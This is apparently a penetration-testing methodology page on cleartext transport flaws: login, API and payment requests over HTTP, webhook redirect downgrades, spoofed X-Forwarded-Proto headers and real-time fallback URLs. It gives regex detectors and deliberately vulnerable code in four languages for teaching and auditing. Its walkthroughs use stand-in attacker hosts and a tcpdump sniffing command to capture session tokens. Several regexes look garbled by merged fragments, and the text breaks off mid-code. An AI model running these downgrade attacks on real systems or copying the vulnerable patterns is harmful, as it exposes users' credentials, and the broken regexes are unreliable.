# Information Unencrypted Channel

## Check List

## Methodology

### Black Box

#### Login Page Over HTTP

{% stepper %}
{% step %}
Access the login page using HTTP instead of HTTPS, Capture the request in Burp Suite

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

username=test&password=Test123
```
{% endstep %}

{% step %}
Check the request scheme in Burp
{% endstep %}

{% step %}
If credentials are transmitted over `http://` instead of `https://`, sensitive data is exposed in cleartext
{% endstep %}

{% step %}
If login works over HTTP without redirecting to HTTPS, unencrypted credential transmission is confirmed
{% endstep %}
{% endstepper %}

***

#### Registration Page Over HTTP

{% stepper %}
{% step %}
Access the registration page using HTTP, Intercept the request

```http
POST /register HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 75

{"email":"user@test.com","password":"Password123"}
```
{% endstep %}

{% step %}
Verify whether the request is sent over HTTP
{% endstep %}

{% step %}
If personal data and passwords are transmitted unencrypted, sensitive information disclosure is confirmed
{% endstep %}
{% endstepper %}

***

#### Password Reset Feature

{% stepper %}
{% step %}
Access the forgot-password endpoint over HTTP, Capture the request

```http
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 40

{"email":"victim@target.com"}
```
{% endstep %}

{% step %}
If the email address is transmitted via HTTP without encryption, account-related data exposure is confirmed
{% endstep %}
{% endstepper %}

***

#### Authenticated Session Cookie Without Secure Flag

{% stepper %}
{% step %}
Login normally over HTTPS and intercept the response, Check the Set-Cookie header

```http
HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123xyz; Path=/; HttpOnly
```
{% endstep %}

{% step %}
If the cookie does not contain the `Secure` flag

```http
Set-Cookie: sessionId=abc123xyz; Path=/; HttpOnly
```
{% endstep %}

{% step %}
Then the session cookie can be transmitted over HTTP, Force browse to HTTP

```http
GET /dashboard HTTP/1.1
Host: target.com
Cookie: sessionId=abc123xyz
```
{% endstep %}

{% step %}
If session remains valid over HTTP, session hijacking risk via unencrypted channel is confirmed
{% endstep %}
{% endstepper %}

***

#### API Endpoints Accessible Over HTTP

{% stepper %}
{% step %}
Access API endpoints using HTTP

```http
GET /api/profile HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token
```
{% endstep %}

{% step %}
If the API responds successfully over HTTP and accepts Authorization headers, token leakage risk exists
{% endstep %}

{% step %}
If sensitive JSON responses are returned over HTTP, unencrypted API communication is confirmed
{% endstep %}
{% endstepper %}

***

#### File Upload Over HTTP

{% stepper %}
{% step %}
Access file upload endpoint via HTTP
{% endstep %}

{% step %}
Capture the request

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----123

------123
Content-Disposition: form-data; name="file"; filename="id.png"
Content-Type: image/png

(binary data)
------123--
```

If file upload works over HTTP, transmitted content can be intercepted
{% endstep %}

{% step %}
If no forced HTTPS redirection exists, unencrypted file transmission is confirmed
{% endstep %}
{% endstepper %}

***

#### Payment or Sensitive Form Submission

{% stepper %}
{% step %}
Access checkout or payment endpoint via HTTP, Capture the request

```http
POST /checkout HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 120

{"cardNumber":"4111111111111111","cvv":"123","expiry":"12/26"}
```
{% endstep %}

{% step %}
If payment details are transmitted over HTTP, critical unencrypted data exposure is confirmed
{% endstep %}
{% endstepper %}

***

#### Internal API Calls in Mobile Applications

{% stepper %}
{% step %}
Analyze mobile app traffic via proxy like burp suite, If API calls are made to

```hurl
http://api.target.com/login
```
{% endstep %}

{% step %}
And credentials or tokens are visible in plaintext, unencrypted transport in mobile backend communication is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Cleartext Token Leakage via Automated Redirect Downgrade in Context-Propagating Webhooks

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Integration" or "Data Export" architecture. Modern enterprise platforms ( ERPs, CRMs) frequently push data to external partner APIs (Bring-Your-Own-Endpoint) or fetch external data on behalf of the user
{% endstep %}

{% step %}
Investigate the "Context Propagation" optimization. To ensure the external partner API knows _which_ enterprise user is pushing the data, the backend implements a global HTTP Interceptor (e.g., `TokenRelayProvider`) that automatically copies the user's internal `Authorization: Bearer` session token and injects it into the outbound external request
{% endstep %}

{% step %}
Analyze the URL validation logic. Observe that the platform enforces strict Transport Layer Security (TLS) by mathematically verifying that the user-provided partner URL begins with `https://` before saving it to the database
{% endstep %}

{% step %}
Examine the HTTP Client factory used by the background worker to dispatch these outbound requests
{% endstep %}

{% step %}
Discover the "Resilient Routing" optimization: External B2B APIs frequently change their routing structures (e.g., migrating from `/v1/` to `/v2/`). To prevent the enterprise dashboard from breaking when a partner API updates its URL, the developer explicitly configures the HTTP Client to automatically follow HTTP Redirects
{% endstep %}

{% step %}
Understand the fatal cryptographic transport boundary failure: While the initial URL is strictly validated as `https://`, the underlying HTTP Client does not enforce "Protocol Parity" during a redirect chain
{% endstep %}

{% step %}
Recognize that if the external server responds with a `301 Redirect` or `302 Found` pointing to an unencrypted `http://` endpoint, the HTTP Client will transparently downgrade the connection to plaintext TCP
{% endstep %}

{% step %}
Furthermore, because the global context propagation attached the `Authorization` header to the HTTP Client instance itself (rather than the specific `https` request message), the sensitive session token survives the downgrade and is broadcasted over the unencrypted channel
{% endstep %}

{% step %}
As an attacker, setup a web server supporting HTTPS and configure it to respond to all incoming requests with a `302 Found` redirecting to `[http://attacker.com](http://attacker.com)` (plaintext)
{% endstep %}

{% step %}
Configure the enterprise integration settings, providing your secure `[https://attacker-secure.com](https://attacker-secure.com)` URL. The backend URL validation passes successfully
{% endstep %}

{% step %}
Trigger the data fetch or webhook dispatch operation via the enterprise dashboard
{% endstep %}

{% step %}
The enterprise backend initiates the secure TLS connection, attaches your active Session Token, and receives your 302 redirect
{% endstep %}

{% step %}
The backend HTTP Client automatically drops the TLS encryption, initiates a plaintext connection to `[http://attacker.com](http://attacker.com)`, and transmits your highly privileged Enterprise Session Token in cleartext over the public internet, exposing it to passive network interception

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:AllowAutoRedirect\s*=\s*(?:true|True)|HttpClientHandler[\s\S]{0,150}?AllowAutoRedirect\s*=\s*true|WebRequestHandler[\s\S]{0,150}?AllowPipelining|HttpClient[\s\S]{0,150}?Redirect|RedirectHandler[\s\S]{0,120}?true)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:followRedirects\s*\(\s*HttpClient\.Redirect\.(?:ALWAYS|NORMAL)\s*\)|HttpClient\.Redirect\.ALWAYS|setInstanceFollowRedirects\s*\(\s*true\s*\)|HttpURLConnection[\s\S]{0,120}?setFollowRedirects|OkHttpClient\.Builder[\s\S]{0,150}?followRedirects\s*\(\s*true)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:header\s*\(\s*['"]X-(?:Telemetry-Error|Error|Exception).*?(?:Padding|Crypto|Decrypt)|header\s*\(\s*['"]X-(?:Telemetry-Error|Error).*?(?:\$e->getMessage|\$e::class)|catch\s*\(\s*(?:Exception|Throwable)\s+\$[a-zA-Z_]+\s*\)[\s\S]{0,150}?header)\b(?:CURLOPT_FOLLOWLOCATION\s*,\s*true|curl_setopt\s*\([\s\S]{0,150}?CURLOPT_FOLLOWLOCATION|CURLOPT_MAXREDIRS\s*,\s*[1-9][0-9]*|GuzzleHttp\\Client[\s\S]{0,150}?allow_redirects\s*=>\s*true|allow_redirects\s*=>\s*\[)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:maxRedirects\s*:\s*[1-9][0-9]*|followRedirects\s*:\s*true|follow\s*\(\s*true\s*\)|axios\.create[\s\S]{0,150}?maxRedirects|request[\s\S]{0,120}?followRedirect)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
AllowAutoRedirect\s*=\s*true|HttpClientHandler.*AllowAutoRedirect|RedirectHandler.*true
```
{% endtab %}

{% tab title="Java" %}
```regexp
followRedirects\s*\(\s*HttpClient\.Redirect\.ALWAYS\s*\)|HttpClient\.Redirect\.ALWAYS|setInstanceFollowRedirects\s*\(\s*true\s*\)|followRedirects\s*\(\s*true
```
{% endtab %}

{% tab title="PHP" %}
```regexp
CURLOPT_FOLLOWLOCATION\s*,\s*true|CURLOPT_MAXREDIRS\s*,\s*[1-9][0-9]*|allow_redirects\s*=>\s*true
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
maxRedirects\s*:\s*[1-9][0-9]*|followRedirects\s*:\s*true|followRedirect\s*:\s*true|axios\.create.*maxRedirects
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class WebhookDispatchService 
{
    private readonly HttpClient _httpClient;

    public WebhookDispatchService() 
    {
        // [1]
        // [2]
        var handler = new HttpClientHandler 
        {
            AllowAutoRedirect = true,
            MaxAutomaticRedirections = 3
        };
        
        _httpClient = new HttpClient(handler);
    }

    public async Task DispatchEventAsync(string partnerUrl, string userSessionToken, object payload) 
    {
        // [3]
        if (!partnerUrl.StartsWith("https://")) 
        {
            throw new ArgumentException("Partner URL must be secure (HTTPS).");
        }

        var request = new HttpRequestMessage(HttpMethod.Post, partnerUrl);
        request.Content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");

        // [4]
        _httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", userSessionToken);
        
        await _httpClient.SendAsync(request);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class WebhookDispatchService {

    private final HttpClient httpClient;

    public WebhookDispatchService() {
        // [1]
        // [2]
        this.httpClient = HttpClient.newBuilder()
            .followRedirects(HttpClient.Redirect.ALWAYS)
            .build();
    }

    public void dispatchEvent(String partnerUrl, String userSessionToken, Object payload) throws Exception {
        // [3]
        if (!partnerUrl.startsWith("https://")) {
            throw new IllegalArgumentException("Partner URL must be secure (HTTPS).");
        }

        ObjectMapper mapper = new ObjectMapper();
        String jsonPayload = mapper.writeValueAsString(payload);

        HttpRequest request = HttpRequest.newBuilder()
            .uri(URI.create(partnerUrl))
            .header("Content-Type", "application/json")
            // [4]
            .header("Authorization", "Bearer " + userSessionToken)
            .POST(HttpRequest.BodyPublishers.ofString(jsonPayload))
            .build();

        httpClient.send(request, HttpResponse.BodyHandlers.ofString());
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class WebhookDispatchService 
{
    public function dispatchEvent(string $partnerUrl, string $userSessionToken, array $payload): void 
    {
        // [3]
        if (strpos($partnerUrl, 'https://') !== 0) 
        {
            throw new InvalidArgumentException("Partner URL must be secure (HTTPS).");
        }

        $ch = curl_init($partnerUrl);
        $jsonData = json_encode($payload);

        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        
        // [1]
        // [2]
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
        
        // [4]
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'Authorization: Bearer ' . $userSessionToken
        ]);

        curl_exec($ch);
        curl_close($ch);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class WebhookDispatchService {
    static async dispatchEvent(partnerUrl, userSessionToken, payload) {
        // [3]
        if (!partnerUrl.startsWith("https://")) {
            throw new Error("Partner URL must be secure (HTTPS).");
        }

        try {
            // [1]
            // [2]
            // [4]
            await axios.post(partnerUrl, payload, {
                maxRedirects: 3, 
                headers: {
                    'Authorization': `Bearer ${userSessionToken}`,
                    'Content-Type': 'application/json'
                }
            });
        } catch (error) {
            console.error("Webhook dispatch failed", error);
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture handles outbound webhook dispatching for external B2B integrations. To ensure enterprise features do not break when a partner changes their API routing, the developer explicitly configures the client to automatically follow HTTP redirects, \[2] The configuration strictly tells the client engine to follow the redirect implicitly, preventing the developer from manually inspecting the destination URL before traversing it, \[3] The developer implements a robust security check at the application layer, mathematically enforcing that the user-provided URL begins with `https://`. This creates a false sense of security, assuming the transport layer is locked, \[4] The fatal architectural overlap. The highly privileged user session token is attached to the request. When the HTTP Client automatically follows a 301/302 redirect pointing to an `http://` URI, it transparently downgrades the connection. The library dutifully preserves the `Authorization` header, blasting the session token in cleartext across the unencrypted network segment

```http
// 1. Attacker configures the integration with a legally validated URL.
POST /api/v1/integrations/configure HTTP/1.1
Host: dashboard.enterprise.tld
Content-Type: application/json
Cookie: SessionId=VALID_ADMIN_TOKEN

{"partner_webhook_url": "https://attacker-secure.com/webhook"}

// 2. Enterprise backend triggers the background worker.
// 3. Worker initiates TLS handshake to attacker-secure.com and sends the payload.
// 4. Attacker's secure server responds with a downgrade redirect.
HTTP/1.1 302 Found
Location: http://attacker-unencrypted.com/webhook
```

```http
// 5. Enterprise backend silently drops the TLS tunnel and initiates a plaintext TCP connection.
// 6. Enterprise backend transmits the payload and the authorization token in cleartext.
POST /webhook HTTP/1.1
Host: attacker-unencrypted.com
Authorization: Bearer [LEAKED_ENTERPRISE_ADMIN_TOKEN]To balance security with integration resilience, the enterprise enforced HTTPS at the database validation layer while configuring the outbound HTTP client to automatically follow routing redirects. When the attacker's server responded with a 302 Found redirecting to an http:// destination, the HTTP client executed the routing directive without enforcing protocol parity. Because the Authorization header was bound to the request scope, it survived the transport downgrade. The highly sensitive administrative session token was transmitted in cleartext over the public internet, completely neutralizing the initial HTTPS validation and exposing the enterprise to passive network sniffing and immediate account takeover.
```
{% endstep %}

{% step %}
To balance security with integration resilience, the enterprise enforced HTTPS at the database validation layer while configuring the outbound HTTP client to automatically follow routing redirects. When the attacker's server responded with a `302 Found` redirecting to an `http://` destination, the HTTP client executed the routing directive without enforcing protocol parity. Because the `Authorization` header was bound to the request scope, it survived the transport downgrade. The highly sensitive administrative session token was transmitted in cleartext over the public internet, completely neutralizing the initial HTTPS validation and exposing the enterprise to passive network sniffing and immediate account takeover
{% endstep %}
{% endstepper %}

***

#### Transport Layer Defense Evasion via Header-Spoofed Internal Routing Downgrade

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a hybrid Service Mesh architecture where microservices are deployed across multiple physical environments (e.g., AWS Cloud and On-Premise Data Centers)
{% endstep %}

{% step %}
Investigate the global Transport Layer Security enforcement policy. To comply with Zero-Trust internal network mandates, every microservice strictly implements a `RequireHttps` middleware. This middleware automatically rejects or redirects incoming `http://` traffic to `https://`
{% endstep %}

{% step %}
Discover the TLS Termination optimization: Processing cryptography on every single microservice is computationally expensive. The enterprise places a local sidecar proxy (e.g., Envoy) in front of each service. The sidecar terminates TLS and forwards the request over unencrypted HTTP to the local microservice via `localhost`
{% endstep %}

{% step %}
Understand how the microservice knows the original connection was secure: The sidecar proxy injects the `X-Forwarded-Proto: https` HTTP header. The `RequireHttps` middleware explicitly trusts this header, bypassing the block if the header indicates the external transport was encrypted
{% endstep %}

{% step %}
Analyze the outbound API calling logic of an upstream microservice (e.g., `Microservice A`) that needs to fetch data from `Microservice B`
{% endstep %}

{% step %}
Notice an engineering friction point: `Microservice A` needs to communicate with `Microservice B` directly over the internal WAN. However, the internal domain name for `Microservice B` uses a self-signed certificate, causing `Microservice A`'s HTTP Client to throw `SSLHandshakeException` errors
{% endstep %}

{% step %}
Discover the fatal workaround: Instead of properly configuring the internal Certificate Authority (CA) root trust, the developer optimizes the communication by bypassing TLS entirely. They configure `Microservice A` to call `[http://microservice-b.internal](http://microservice-b.internal)`
{% endstep %}

{% step %}
To prevent `Microservice B`'s `RequireHttps` middleware from rejecting this plaintext internal request, the developer explicitly forces `Microservice A`'s HTTP client to inject the `X-Forwarded-Proto: https` header into the outbound request.
{% endstep %}

{% step %}
The architectural assumption is that the internal WAN connecting the cloud and the on-premise data center is a physically secure, isolated network (e.g., IPSec VPN or AWS Direct Connect)
{% endstep %}

{% step %}
Leverage an internal network position (e.g., via a compromised low-privilege container, an SSRF vulnerability, or a misconfigured routing table that pushes this traffic over the public internet)
{% endstep %}

{% step %}
Perform network sniffing (e.g., `tcpdump` or Wireshark) on the transit segment
{% endstep %}

{% step %}
Because `Microservice A` spoofed the `X-Forwarded-Proto` header, `Microservice B` accepts the unencrypted traffic. Highly sensitive internal data (Customer PII, Internal Admin JWTs) is transmitted in completely unencrypted cleartext across the transit network, violating the entire Zero-Trust architecture

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Response\.Headers\.(?:Add|Append|TryAddWithoutValidation)\s*\(\s*"X-(?:Telemetry-Error|Error|Debug|Exception)"[\s\S]{0,150}?(?:ex\.GetType\(\)|ex\.Message|ex\.GetType|Exception\.GetType)|Response\.Headers[\s\S]{0,120}?(?:Padding|Cryptographic|Decrypt|CryptoException)|catch\s*\(\s*(?:Exception|CryptographicException)\s+ex\s*\)[\s\S]{0,150}?Headers)\b(?:Request\.Headers\.(?:Add|Append|TryAddWithoutValidation)\s*\(\s*"X-Forwarded-Proto"\s*,\s*"https"\s*\)|HttpRequestMessage[\s\S]{0,120}?Headers[\s\S]{0,100}?Add\s*\(\s*"X-Forwarded-Proto"|ForwardedHeadersOptions[\s\S]{0,150}?ForwardedHeaders\.Proto|XForwardedProto|Request\.Scheme\s*=\s*"https")
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:request\.getHeaders\(\)\.add\s*\(\s*"X-Forwarded-Proto"\s*,\s*"https"\s*\)|request\.addHeader\s*\(\s*"X-Forwarded-Proto"\s*,\s*"https"\s*\)|HttpHeaders[\s\S]{0,120}?add\s*\(\s*"X-Forwarded-Proto"|ForwardedHeaderFilter|XForwardedProto)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:CURLOPT_HTTPHEADER[\s\S]{0,150}?'X-Forwarded-Proto:\s*https'|curl_setopt\s*\([\s\S]{0,150}?X-Forwarded-Proto|header\s*\(\s*['"]X-Forwarded-Proto:\s*https['"]|Request::header[\s\S]{0,100}?X-Forwarded-Proto)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:headers\s*:\s*\{\s*['"]X-Forwarded-Proto['"]\s*:\s*['"]https['"]\s*\}|req\.headers\s*\[\s*['"]x-forwarded-proto['"]\s*\]|res\.setHeader\s*\(\s*['"]X-Forwarded-Proto['"]\s*,\s*['"]https['"]\s*\)|proxy-addr|trust proxy)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Request\.Headers\.(Add|Append|TryAddWithoutValidation)\("X-Forwarded-Proto"\s*,\s*"https"|ForwardedHeadersOptions.*ForwardedHeaders\.Proto|Request\.Scheme\s*=\s*"https"
```
{% endtab %}

{% tab title="Java" %}
```regexp
request\.getHeaders\(\)\.add\("X-Forwarded-Proto"\s*,\s*"https"|request\.addHeader\("X-Forwarded-Proto"\s*,\s*"https"|ForwardedHeaderFilter|XForwardedProto
```
{% endtab %}

{% tab title="PHP" %}
```regexp
CURLOPT_HTTPHEADER.*X-Forwarded-Proto:\s*https|curl_setopt.*X-Forwarded-Proto|header\(['"]X-Forwarded-Proto:\s*https['"]
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
headers\s*:\s*\{\s*['"]X-Forwarded-Proto['"]\s*:\s*['"]https['"]\s*\}|res\.setHeader\(['"]X-Forwarded-Proto['"]\s*,\s*['"]https['"]|trust proxy|proxy-addr
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class InternalDataClient 
{
    private readonly HttpClient _httpClient;

    public InternalDataClient() 
    {
        _httpClient = new HttpClient();
        _httpClient.BaseAddress = new Uri("http://microservice-b.internal.corp");
    }

    public async Task<string> FetchSensitiveCustomerDataAsync(string userId, string internalJwt) 
    {
        var request = new HttpRequestMessage(HttpMethod.Get, $"/api/v1/customers/{userId}");
        request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", internalJwt);
        
        // [1]
        // [2]
        // [3]
        // [4]
        request.Headers.Add("X-Forwarded-Proto", "https");
        
        var response = await _httpClient.SendAsync(request);
        return await response.Content.ReadAsStringAsync();
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class InternalDataClient {

    private final HttpClient httpClient;
    private final String baseUrl = "http://microservice-b.internal.corp";

    public InternalDataClient() {
        this.httpClient = HttpClient.newHttpClient();
    }

    public String fetchSensitiveCustomerData(String userId, String internalJwt) throws Exception {
        // [1]
        // [2]
        // [3]
        // [4]
        HttpRequest request = HttpRequest.newBuilder()
            .uri(URI.create(baseUrl + "/api/v1/customers/" + userId))
            .header("Authorization", "Bearer " + internalJwt)
            .header("X-Forwarded-Proto", "https")
            .GET()
            .build();

        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
        return response.body();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class InternalDataClient 
{
    protected $baseUrl = 'http://microservice-b.internal.corp';

    public function fetchSensitiveCustomerData(string $userId, string $internalJwt): string 
    {
        $ch = curl_init($this->baseUrl . "/api/v1/customers/" . $userId);

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        // [1]
        // [2]
        // [3]
        // [4]
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Authorization: Bearer ' . $internalJwt,
            'X-Forwarded-Proto: https'
        ]);

        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class InternalDataClient {
    static baseUrl = 'http://microservice-b.internal.corp';

    static async fetchSensitiveCustomerData(userId, internalJwt) {
        try {
            // [1]
            // [2]
            // [3]
            // [4]
            let response = await axios.get(`${this.baseUrl}/api/v1/customers/${userId}`, {
                headers: {
                    'Authorization': `Bearer ${internalJwt}`,
                    'X-Forwarded-Proto': 'https'
                }
            });
            return response.data;
        } catch (error) {
            console.error("Internal fetch failed", error);
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The upstream microservice explicitly formats the internal Base URL using the unencrypted `http://` protocol to avoid dealing with self-signed certificate validation errors on the internal WAN, \[2] The downstream microservice runs a `RequireHttps` global middleware. It will automatically reject any incoming `http://` traffic with a `403 Forbidden` or redirect it via `301`\[3] The downstream middleware relies entirely on the `X-Forwarded-Proto` header, trusting that it was exclusively populated by the enterprise TLS-terminating load balancer, \[4] The fatal architectural bypass. To successfully transit the unencrypted channel without triggering the downstream security block, the developer hardcodes the spoofed `X-Forwarded-Proto: https` header into the outbound HTTP client. This completely disables the transport layer security enforcement, exposing highly sensitive internal JWTs and customer data to cleartext interception

```http
// 1. Attacker establishes a network sniffing position on the transit network (e.g., compromised internal container or misrouted cloud peering).
// 2. The Upstream Microservice initiates an internal request to fetch customer data.
// 3. The Attacker executes tcpdump: `tcpdump -i eth0 -A 'tcp port 80'`

// 4. The Attacker intercepts the following cleartext payload traversing the wire:
GET /api/v1/customers/9912 HTTP/1.1
Host: microservice-b.internal.corp
Authorization: Bearer eyJhbGci...[HIGHLY_SENSITIVE_INTERNAL_JWT]...
X-Forwarded-Proto: https

// 5. The Downstream microservice responds in cleartext:
HTTP/1.1 200 OK
Content-Type: application/json

{"customerId": 9912, "socialSecurityNumber": "XXX-XX-XXXX", "creditCard": "XXXX-XXXX-XXXX-1234"}
```
{% endstep %}

{% step %}
To optimize developer velocity and bypass internal Certificate Authority infrastructure issues, the developer intentionally abandoned Transport Layer Security between two internal microservices. Knowing that the downstream service legally mandated HTTPS, the developer injected a forged `X-Forwarded-Proto` header, mimicking the behavior of a TLS-terminating sidecar proxy. Because the downstream security middleware blindly trusted this header as proof of external encryption, it accepted the request. Consequently, highly sensitive internal API tokens and Customer PII were transmitted via pure, unencrypted HTTP over the internal network segment. Any adversary with passive network visibility immediately captures these credentials in cleartext, resulting in the total collapse of the Zero-Trust mesh architecture
{% endstep %}
{% endstepper %}

***

#### Cleartext Session Disclosure via Protocol-Relative Fallback in Real-Time Transports

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on persistent, real-time connections (e.g., Live Trading Dashboards, SOC Telemetry feeds)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the real-time enterprise architecture. The platform utilizes WebSockets (`wss://`) over strict HTTPS to stream sensitive financial or operational data to the client SPA
{% endstep %}

{% step %}
Investigate the "Transport Fallback" optimization. Many corporate enterprise firewalls aggressively terminate or block WebSocket `Upgrade` headers. To ensure the dashboard remains functional for all B2B clients, the developers implement a fallback mechanism (e.g., SignalR, Socket.io). If the `wss://` handshake fails, the client degrades to Server-Sent Events (SSE), and finally to HTTP Long-Polling
{% endstep %}

{% step %}
Analyze the backend connection negotiation logic. The backend provides the client with a JSON payload containing the available fallback URLs during the initial HTTP handshake
{% endstep %}

{% step %}
Discover the architectural flaw: To support dynamic environments and multi-tenant subdomains, the backend dynamically generates these fallback URLs based on the incoming `X-Forwarded-Proto` header, or falls back to the raw TCP socket scheme if the header is missing
{% endstep %}

{% step %}
Evaluate the Load Balancer configuration. In highly available multi-region setups, the primary TLS terminator explicitly drops or fails to append `X-Forwarded-Proto: https` during the initial handshake request, or an attacker actively intercepts a non-HSTS initial connection and explicitly sets `X-Forwarded-Proto: http`
{% endstep %}

{% step %}
The backend server reads the missing or tampered header, assumes the active context is unencrypted, and generates the fallback URLs using the `http://` scheme (e.g., `[http://enterprise.com/socket/long-poll](http://enterprise.com/socket/long-poll)`)
{% endstep %}

{% step %}
Start the authentication flow. The client receives the dynamically generated fallback configuration payload
{% endstep %}

{% step %}
The client attempts to connect via `wss://`
{% endstep %}

{% step %}
Simulate a corporate firewall (or actively block the WebSocket upgrade via a local network attack). The client aborts the WebSocket connection
{% endstep %}

{% step %}
The client parses the backend-provided fallback URL. Because the URL explicitly specifies `http://`, the client gracefully degrades the transport layer
{% endstep %}

{% step %}
The client initiates an unencrypted Long-Polling HTTP connection to the fallback endpoint, transmitting the highly privileged `Authorization: Bearer` session token in cleartext over the public internet to authenticate the real-time stream

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:var\s+\w+\s*=\s*Request\.Headers\s*\[\s*"X-Forwarded-Proto"\s*\]\.(?:FirstOrDefault\(\)|ToString\(\))\s*\?\?\s*Request\.Scheme|Request\.Headers\s*\[\s*"X-Forwarded-Proto"\s*\][\s\S]{0,150}?(?:Redirect|Cookie|Scheme|Url)|Request\.Headers\.GetCommaSeparatedValues\s*\(\s*"X-Forwarded-Proto"\s*\)|Request\.Scheme\s*=\s*Request\.Headers)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:request\.getHeader\s*\(\s*"X-Forwarded-Proto"\s*\)\s*!=\s*null\s*\?\s*request\.getHeader\s*\(\s*"X-Forwarded-Proto"\s*\)|request\.getHeader\s*\(\s*"X-Forwarded-Proto"\s*\)[\s\S]{0,150}?(?:redirect|sendRedirect|setCookie|scheme)|ServletUriComponentsBuilder[\s\S]{0,120}?X-Forwarded-Proto|ForwardedHeaderFilter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$request->header\s*\(\s*['"]X-Forwarded-Proto['"]\s*,\s*\$request->getScheme\(\)\s*\)|\$request->header\s*\(\s*['"]X-Forwarded-Proto['"]\s*\)[\s\S]{0,150}?(?:redirect|url|cookie|scheme)|Request::secure\(\)|URL::forceScheme)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:req\.headers\s*\[\s*['"]x-forwarded-proto['"]\s*\]\s*\|\|\s*req\.protocol|req\.headers\s*\[\s*['"]x-forwarded-proto['"]\s*\][\s\S]{0,150}?(?:redirect|cookie|url|protocol)|req\.protocol\s*=\s*req\.headers|app\.set\s*\(\s*['"]trust proxy['"])
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Request\.Headers\["X-Forwarded-Proto"\]\.(FirstOrDefault\(\)|ToString\(\)).*\?\?.*Request\.Scheme|Request\.Headers.*X-Forwarded-Proto.*Request\.Scheme
```
{% endtab %}

{% tab title="Java" %}
```regexp
request\.getHeader\("X-Forwarded-Proto"\)\s*!=\s*null\s*\?\s*request\.getHeader|request\.getHeader\("X-Forwarded-Proto"\).*redirect|sendRedirect.*X-Forwarded-Proto
```
{% endtab %}

{% tab title="PHP" %}
```regexp
request\.getHeader\("X-Forwarded-Proto"\)\s*!=\s*null\s*\?\s*request\.getHeader|request\.getHeader\("X-Forwarded-Proto"\).*redirect|sendRedirect.*X-Forwarded-Proto\$request->header\('X-Forwarded-Proto',\s*\$request->getScheme\(\)\)|\$request->header\('X-Forwarded-Proto'.*redirect|URL::forceScheme
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
req\.headers\['x-forwarded-proto'\]\s*\|\|\s*req\.protocol|req\.headers\['x-forwarded-proto'\].*redirect|trust proxy
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/api/v1/realtime/negotiate")]
public IActionResult NegotiateConnection() 
{
    // [1]
    // [2]
    // [3]
    var scheme = Request.Headers["X-Forwarded-Proto"].FirstOrDefault() ?? Request.Scheme;
    var host = Request.Host.Value;

